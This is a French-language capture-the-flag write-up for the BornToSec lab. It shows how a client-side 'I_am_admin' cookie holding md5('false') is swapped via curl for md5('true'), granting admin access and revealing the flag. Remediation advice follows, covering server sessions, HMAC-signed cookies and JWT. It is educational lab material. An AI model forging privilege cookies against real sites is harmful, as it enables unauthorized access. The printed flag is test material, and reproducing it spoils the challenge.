# Analyse de la faille — CTF BornToSec (cookie `I_am_admin`)

**Contexte**  
CTF autorisé — cible : `http://192.168.64.3/index.php?page=redirect&site=http://example.com`.  
Le test montre qu'un cookie nommé `I_am_admin` contient une valeur MD5 correspondant au statut d'admin (`false` ou `true`). En modifiant ce cookie côté client (ou via requête HTTP) on obtient l'accès à la fonctionnalité d'administration et la flag.

---

## 1) Comment on a trouvé la faille (reproduction / démarche)
1. **Observation initiale**  
   Requête curl pour afficher les en-têtes `Set-Cookie` :
   ```bash
   curl -sI "http://192.168.64.3/index.php?page=redirect&site=http://example.com" | grep -i '^Set-Cookie:'
   ```
   On obtient :  
   ```
   Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; ...
   ```
   La valeur `68934a3e9455fa72420237eb05902327` correspond à `md5("false")`.

2. **Hypothèse**  
   Le site semble utiliser un flag « suis-je admin » stocké côté client sous forme d’un hash MD5 du texte `true`/`false`. Comme le serveur accepte ce cookie pour décider des droits, il est probable qu'en remplaçant la valeur par `md5("true")` on obtient les droits admin.

3. **Test pratique (curl)**  
   Remplacement du cookie par MD5("true") :
   ```bash
   curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
   ```
   Réponse : page HTML contenant la flag (extrait) :
   ```
   Good Job Here is the flag : b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
   ```
   On a donc confirmé que la modification du cookie octroie les droits.

---

## 2) Explication technique de la faille (pour le write-up)
### Description succincte
Le site stocke un indicateur d'autorisation (`I_am_admin`) côté client dans un cookie contenant **un MD5 du texte** `"true"` ou `"false"`. Le serveur fait confiance à ce cookie et autorise les actions administratives si la valeur correspond à `md5("true")`. Ce mécanisme est fondamentalement non sécurisé car le client peut modifier son cookie.

### Pourquoi c'est vulnérable
- **Confiance dans les données client** : Tout cookie client est contrôlable par l'utilisateur. Stocker un flag de privilège côté client sans protection d'intégrité permet de le falsifier.  
- **Absence d'authentification/integrité (clé secrète)** : Un simple hachage (MD5(payload)) sans clé secrète (HMAC) ne protège pas contre la falsification.  
- **MD5 inadapté** : MD5 est obsolète pour l'intégrité et susceptible de collisions ; mais le problème majeur ici est l'absence de signature plutôt que la faiblesse du hash en elle-même.  
- **Manque de vérification côté serveur** : Le serveur devrait vérifier l'identité/les droits à partir d'un stockage serveur de confiance (session, DB) au lieu d'interpréter un flag client.

### Impact
- Escalade de privilèges locale : tout utilisateur peut devenir admin simplement en changeant un cookie.  
- Exposition potentielle de données sensibles et opérations critiques (modification d'utilisateurs, accès à flags/ressources protégées).

---

## 3) Preuves / PoC (commandes utiles)
### Commande curl (PoC simple)
```bash
curl -i -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" "http://192.168.64.3/index.php?page=redirect&site=http://example.com"
```

---

## 4) Correctifs & bonnes pratiques
### 4.1 Meilleure approche — sessions côté serveur (recommandé)
- Ne stocker **aucun** droit d'accès directement côté client.
- Stocker `user_id` et `roles` dans une session côté serveur (mémoire, Redis, base, etc.). Le cookie transmis au client ne contient que un `session_id` opaque.
- Configurer le cookie de session : `HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age` raisonnable.
- Vérifier à chaque requête les droits côté serveur avant d'autoriser l'action.

### 4.2 Si stockage côté client nécessaire — signer le cookie
- Utiliser une MAC (HMAC-SHA256) avec **une clé serveur secrète** :
  - Stocker `payload` + `signature = HMAC(secret, payload)`.
  - À la réception, recalculer la signature et refuser si elle ne correspond pas.
- Exemple de format : `value = base64(payload) + "." + hex(hmac)`.
- Ne jamais utiliser un simple hash sans clé (md5(payload) ne suffit pas).

### 4.3 Utiliser JWT correctement (si stateless voulu)
- JWT signé (HS256 ou mieux RS256) avec vérification de `iss`, `aud`, `exp`.  
- Prévoir mécanisme de révocation / rotation si besoin (ou adopter un store central si révocation nécessaire).

### 4.4 Durcissements additionnels
- Attributs cookie : `HttpOnly`, `Secure`, `SameSite=Strict` (`Lax` si besoin compatibilité).  
- Rotation régulière des clés secrètes et invalidation des sessions après rotation selon procédure.  
- Logging et alerting sur tentatives de falsification (signatures invalides, cookies altérés).  
- Revue de code & tests d'accès (unitaires + intégration) pour endpoints sensibles.  
- Limiter l'exposition des informations dans les cookies (minimalisme).

---
